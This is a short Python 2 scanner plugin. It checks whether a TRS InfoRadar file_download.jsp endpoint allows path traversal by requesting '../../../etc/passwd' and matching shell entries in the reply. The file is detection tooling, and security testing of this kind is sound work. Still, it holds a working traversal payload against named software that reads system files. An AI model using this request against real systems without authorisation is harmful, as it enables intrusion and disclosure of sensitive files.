#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = ""
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "inforadar/jsp/file/file_download.jsp?fileType=file&fileName=../../../../../../../../../../../../../../etc/passwd"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if re.search('/bin/(bash|sh)[^\r\n<>]*[\r\n]', content) and res['status']!='404':
            request = getRequest(url,'GET')
            response = getResponse(res)
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s"%(content)
            #end if
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:trsreadfilescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:trsreadfilescript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def